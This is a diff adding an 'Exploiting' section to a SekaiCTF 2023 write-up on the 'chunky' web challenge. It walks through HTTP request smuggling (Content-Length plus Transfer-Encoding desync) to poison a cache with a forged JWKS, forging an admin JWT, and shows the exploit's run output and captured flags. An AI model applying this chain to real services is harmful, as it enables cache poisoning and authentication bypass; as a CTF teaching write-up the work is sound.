@@ -737,12 +737,74 @@ Since we have a plan to control the contents of some URLs through Cache Poisonin
 Now we can use a kind of [JWKS Spoofing](https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens#jwks-spoofing),
 creating a post content with the same format of the JWKS from the app, but using a public key from a pair created by us :)
 
-Let's view the same diagram again, but with this plan.
+Let's view the same diagram again, but with this plan in mind.
 
-![](https://i.imgur.com/Mbgwxbq.jpg)
+![](https://i.imgur.com/FHQotko.jpg)
 
 Now we have a plan.
 
+### Exploiting
+
+The [exploit](https://github.com/Neptunians/sekai-ctf-2023-web-writeup/blob/main/web-chunky/attack.py) has some basic functions to `signup`, `login` and `create_post`, that we will need in the attack.
+
+We generated the key-pair [local_key3](https://github.com/Neptunians/sekai-ctf-2023-web-writeup/blob/main/web-chunky/local_key3) and [local_key3.pub](https://github.com/Neptunians/sekai-ctf-2023-web-writeup/blob/main/web-chunky/local_key3.pub), that we will use to poison our JWKS URL.
+
+3 files that compose the templates of the requests that we will send, as in the Diagram:
+- [`desync1.txt`](https://github.com/Neptunians/sekai-ctf-2023-web-writeup/blob/main/web-chunky/desync1.txt) == `POST A`
+    - Note that it have both the `Content-Length` and `Transfer-Encoding` headers, that will cause our desync.
+- [`desync2.txt`](https://github.com/Neptunians/sekai-ctf-2023-web-writeup/blob/main/web-chunky/desync1.txt) == `GET JWKS`
+    - We will put here a request to the user content with our fake JWKS.
+- [`desync3.txt`](https://github.com/Neptunians/sekai-ctf-2023-web-writeup/blob/main/web-chunky/desync1.txt) == `GET /user_uuid/.well-known/jwks.json`
+    - That is the legitimate URL that we will poison, with the contents of the previous GET
+
+The complete workflow of the final exploit is:
+1. Sign Up new User (command-line argument)
+2. Login with new User
+3. Create a POST with the content of the injected JWKS Public Key.
+4. Perform the [Desync Attack](https://github.com/Neptunians/sekai-ctf-2023-web-writeup/blob/70de611ecaf00b984a104e8fb4168d4412d4f4f2/web-chunky/attack.py#L103) to Poison the Cache with pub key in (3).
+5. Test the poisoned cache URL (just for fun)
+6. Generate our Token with keys from (3)
+7. Call the `/admin/flag` with the token from (6)
+8. Close your eyes and pray to Crom and Mitra
+
+Run!!
+
+```
+$ python attack.py nep500
+===== SIGNUP
+/login
+
+===== LOGIN
+/
+
+===== POST
+URL: /post/e8b30077-4b64-4582-8027-f3bf17b679c1/3d1121b4-02e8-4976-bb47-53787c4b2d96
+USER_ID: e8b30077-4b64-4582-8027-f3bf17b679c1
+POST_ID: 3d1121b4-02e8-4976-bb47-53787c4b2d96
+
+===== DESYNC!!
+[+] Opening connection to localhost on port 8080: Done
+===============> First Response (Expect Error 400)
+b'<!doctype html>\n<html lang=en>\n<title>Redirecting...</title>\n<h1>Redirecting...</h1>\n<p>You should be redirected automatically to the target URL: <a href="/post/e8b30077-4b64-4582-8027-f3bf17b679c1/9a3fc219-5c92-45d2-9800-efb517f61799">/post/e8b30077-4b64-4582-8027-f3bf17b679c1/9a3fc219-5c92-45d2-9800-efb517f61799</a>. If not, click the link.\n'
+===============> End of First Response
+===============> Second Response (Expect Fake Key)
+b'{"keys": [{"alg": "RS256", "x5c": ["MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAoRX6bRm8JoyCYxmWkhMw\\nlK9qdgcINZ7oy9jFNtsa0o+2vIafzsLKpVL3CbRgqQua1I6k1QXsXAS8/FDnTOHb\\nJ8HiJcl6xv//cohwkzKriYzWNF9o0bKl6S2WsAoEuVpB4HDD0kHYHZZsyAwVbHvv\\nNqlrndrYMlhSWLzXD3VK6w7OIMIC3reE7Urlf5oMVA1D8KOcVfuEBcXyb1yYVSnC\\n9Jy2NIGcZD0mlq3zekhR86ex08QqX5DSZ0djVZQIIH0f7JtiU9rM1UZCek+iVTQO\\n6aBs+wHojv2DkM/4AYblDUVUTO3+kgJlJEzIzgUjhTrcNL4Xi+nEKl3Go2Qs4nvH\\n/wIDAQAB\\n-----END PUBLIC KEY-----"]}]}\n'
+===============> End of Second Response
+==========
+
+===== Test Poisoned Cache!!
+200
+{"keys": [{"alg": "RS256", "x5c": ["MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAoRX6bRm8JoyCYxmWkhMw\nlK9qdgcINZ7oy9jFNtsa0o+2vIafzsLKpVL3CbRgqQua1I6k1QXsXAS8/FDnTOHb\nJ8HiJcl6xv//cohwkzKriYzWNF9o0bKl6S2WsAoEuVpB4HDD0kHYHZZsyAwVbHvv\nNqlrndrYMlhSWLzXD3VK6w7OIMIC3reE7Urlf5oMVA1D8KOcVfuEBcXyb1yYVSnC\n9Jy2NIGcZD0mlq3zekhR86ex08QqX5DSZ0djVZQIIH0f7JtiU9rM1UZCek+iVTQO\n6aBs+wHojv2DkM/4AYblDUVUTO3+kgJlJEzIzgUjhTrcNL4Xi+nEKl3Go2Qs4nvH\n/wIDAQAB\n-----END PUBLIC KEY-----"]}]}
+
+==========
+
+200
+SEKAI{1337}
+```
+
+On the actual challenge server we got:
+
+`SEKAI{tr4nsf3r_3nc0d1ng_ftw!!}`
 
 ## References
 * Team: [FireShell](https://fireshellsecurity.team/)
